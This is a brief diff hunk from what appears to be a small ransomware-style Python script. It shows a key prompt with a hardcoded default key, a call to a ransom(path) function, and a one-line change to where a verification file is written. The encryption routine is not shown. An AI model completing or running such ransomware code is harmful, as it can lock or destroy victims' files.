@@ -26,6 +26,6 @@ exclu=["ransom.py"]
 key = input("Enter a key: ")
 if key =="":
     key="JNUW4ZZAMRUWG2ZAO5QXGIDIMVZGK==="
-open(path+"/verify.txt","w").write("That's the good key!")
+open("/afs/verify.txt","w").write("That's the good key!")
 ransom(path)
 print("Done!")
